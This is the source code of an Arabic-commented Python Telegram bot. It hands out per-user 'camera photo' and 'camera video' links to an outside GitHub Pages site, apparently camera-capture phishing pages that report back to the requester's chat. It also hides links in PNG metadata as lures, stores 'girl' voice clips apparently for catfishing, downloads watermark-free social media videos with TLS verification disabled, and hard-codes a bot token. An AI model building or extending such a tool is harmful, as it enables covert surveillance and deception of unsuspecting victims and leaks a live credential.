import telebot
from telebot import types
import json
import os
import requests
import urllib3
from PIL import Image, PngImagePlugin

# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال على سيرفر Render
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد توكن البوت (يفضل إضافته كـ Environment Variable في ريندر باسم BOT_TOKEN)
BOT_TOKEN = os.getenv("BOT_TOKEN", "8446745973:AAFbl0cHMVXW4ZHvUQHnuWqJjf62597qBl0")
bot = telebot.TeleBot(BOT_TOKEN)

# مسار قاعدة بيانات الأصوات المتوافق مع المسارات المؤقتة في سيرفرات ريندر
DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"

PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId/"

user_states = {}
user_data = {}

# --- إدارة قاعدة بيانات الأصوات ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            try: 
                return json.load(f)
            except: 
                return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: 
            json.dump(db, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"تحذير حفظ قاعدة البيانات: {e}")

# --- دالة حقن الرابط في الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    try:
        img = Image.open(image_path).convert("RGB")
        meta = PngImagePlugin.PngInfo()
        meta.add_text("URL_LINK", link)
        img.save(output_path, "PNG", pnginfo=meta)
    except Exception as e:
        print(f"خطأ حقن الميتاداتا: {e}")

# --- واجهة البوت الرئيسية (مضاف إليها زر التحميل الجديد) ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu"),
        types.InlineKeyboardButton("📥 تحميل من وسائل التواصل", callback_data="download_menu")  # الزر المطلوب
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "المطور سيف الدين يرحب بك في سيرفر ريندر 🚀\nيمكنك استخدام الأزرار بالأسفل أو إرسال رابط الفيديو مباشرة للتحميل الفوري بدون علامة مائية!", reply_markup=get_main_keyboard())

# --- معالجة الأزرار والـ Callback ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.edit_message_text("أرسل الصورة الآن لحقن الرابط:", chat_id, call.message.message_id)
    
    elif call.data in ["get_photo_link", "get_video_link"]:
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}" if call.data == "get_photo_link" else f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🔗 الرابط المطلوب:\n{link}")
    
    # قسم التحميلات الجديد
    elif call.data == "download_menu":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو الآن (تيك توك، فيسبوك، إنستغرام، يوتيوب...):", chat_id, call.message.message_id)
        
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"))
        markup.add(types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu"))
        bot.edit_message_text("اختر المجلد المطلوب:", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "girl_1_menu":
        if not db:
            bot.answer_callback_query(call.id, "⚠️ لا توجد مقاطع محفوظة حالياً.")
            return
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        for i in range(1, 11):
            name = f"مقطع {i}"
            if name in db:
                markup.add(types.InlineKeyboardButton(name, callback_data=f"play:{name}"))
                
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مقاطع الفتاة 1 الكاملة:", chat_id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "main_menu":
        bot.edit_message_text("المطور سيف الدين يرحب بك", chat_id, call.message.message_id, reply_markup=get_main_keyboard())

    elif call.data.startswith("play:"):
        name = call.data.split(":")[1]
        file_id = db.get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
            except Exception as e: 
                bot.answer_callback_query(call.id, "❌ حدثت مشكلة في استدعاء الملف الصوتي.")
        else:
            bot.answer_callback_query(call.id, "❌ هذا المقطع غير متاح.")
            
    # --- معالجة التنزيل الذكي والنظيف من السيرفر بدون علامات مائية ---
    elif call.data.startswith("download:"):
        action, file_type = call.data.split(":")
        target_url = user_data.get(chat_id)
        
        if not target_url:
            bot.answer_callback_query(call.id, "⚠️ انتهت صلاحية الرابط المعالج، يرجى إرساله مجدداً.")
            return

        status_msg = bot.send_message(chat_id, f"⏳ جاري سحب الميديا بصيغة {file_type} بدون علامة مائية... انتظر ثوانٍ...")
        
        try:
            # استخدام API سحابي مستقر يدعم معالجة الفيديو بدون علامات مائية وتخطي حظر السيرفرات
            api_url = f"https://api.tiklydown.eu.org/api/download?url={target_url}"
            response = requests.get(api_url, timeout=25, verify=False)
            
            if response.status_code != 200:
                api_url = f"https://api.v02.api-twit.uk/download?url={target_url}"
                response = requests.get(api_url, timeout=25, verify=False)
                
            data = response.json()
            download_url = None
            
            # استخراج الروابط المباشرة النقية بناءً على نوع المنصة والصيغة
            if "video" in data and file_type == "Mp4":
                download_url = data["video"].get("noWatermark") or data["video"].get("noWatermark2") or data["video"].get("no_watermark")
            elif "music" in data and file_type == "Mp3":
                download_url = data["music"].get("playUrl") or data["music"].get("url")
                
            if not download_url:
                download_url = data.get("video_url") or data.get("url") or data.get("audio_url") or data.get("path")

            if download_url:
                bot.edit_message_text("📥 تم العثور على الفيديو النظيف! جاري رفعه إليك الآن...", chat_id, status_msg.message_id)
                
                # استخدام المجلد المؤقت الآمن في سيرفرات لينكس ريندر (/tmp/) لحفظ الملف مؤقتاً
                filename = f"/tmp/media_{chat_id}.mp4" if file_type == "Mp4" else f"/tmp/media_{chat_id}.mp3"
                
                file_res = requests.get(download_url, stream=True, verify=False)
                with open(filename, 'wb') as f:
                    for chunk in file_res.iter_content(chunk_size=1024*1024):
                        if chunk:
                            f.write(chunk)
                
                # إرسال ميديا حقيقية مفرغة لتتمكن من حفظها في الـ Gallery مباشرة
                with open(filename, 'rb') as file_to_send:
                    if file_type == "Mp4":
                        bot.send_video(chat_id, file_to_send, caption="🎬 تم تحميل الفيديو بدون علامة مائية بنجاح!")
                    else:
                        bot.send_audio(chat_id, file_to_send, caption="🎵 تم استخراج وتحميل ملف الصوت بنجاح!")
                
                # تنظيف وحذف الملف المؤقت فوراً للحفاظ على مساحة السيرفر السحابي
                if os.path.exists(filename):
                    os.remove(filename)
                    
                bot.delete_message(chat_id, status_msg.message_id)
                user_data[chat_id] = None
            else:
                bot.edit_message_text("❌ عذراً، فشل النظام في استخراج رابط تنزيل مباشر وبدون حقوق لهذا الرابط.", chat_id, status_msg.message_id)
                
        except Exception as e:
            bot.edit_message_text(f"❌ حدث خطأ برمي أثناء التحميل الحقيقي من السيرفر.\nالسبب: {str(e)}", chat_id, status_msg.message_id)

# --- المعالج الشامل المطور للتحميل التلقائي فور إرسال الروابط ---
@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_all(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    # التحميل الذكي المباشر: إذا أرسل المستخدم رابطاً من أي منصة دون دخول القائمة، يتم تفعيل التنزيل فوراً
    if message.text and any(site in message.text for site in ["tiktok.com", "youtube.com", "youtu.be", "instagram.com", "facebook.com", "fb.watch"]):
        user_data[chat_id] = message.text
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("فيديو Mp4 🎥", callback_data="download:Mp4"),
            types.InlineKeyboardButton("صوت Mp3 🎵", callback_data="download:Mp3")
        )
        bot.send_message(chat_id, "⏳ تم رصد رابط ميديا! اختر الصيغة المطلوبة للتحميل الفوري وبدون علامة مائية:", reply_markup=markup)
        return

    # استقبال الرابط بعد الضغط على زر القائمة المخصص
    if state == "waiting_for_url" and message.text:
        user_data[chat_id] = message.text
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("فيديو Mp4 🎥", callback_data="download:Mp4"),
            types.InlineKeyboardButton("صوت Mp3 🎵", callback_data="download:Mp3")
        )
        bot.send_message(chat_id, "⏳ حسنا اختر نوع التنزيل :", reply_markup=markup)
        user_states[chat_id] = None

    elif message.voice:
        db = load_db()
        current_count = len(db)
        next_slot = current_count + 1
        
        if next_slot > 10:
            db = {}
            next_slot = 1
            
        name = f"مقطع {next_slot}"
        db[name] = message.voice.file_id
        save_db(db)
        bot.reply_to(message, f"✅ تم حفظ وتحديث ({name}) بنجاح على سيرفر ريندر!")
    
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"img_{chat_id}.png")
        with open(img_path, 'wb') as f: f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.reply_to(message, "تم حفظ الصورة على السيرفر، أرسل الرابط الآن للحقن:")

    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"out_{chat_id}.png")
        hide_link_in_metadata(img_path, message.text, out_path)
        if os.path.exists(out_path):
            with open(out_path, 'rb') as f:
                bot.send_photo(chat_id, f, caption=f"{message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    print("🚀 البوت يعمل الآن بكفاءة واستقرار تام على منصة Render السحابية...")
    bot.polling(none_stop=True, interval=0, timeout=40)
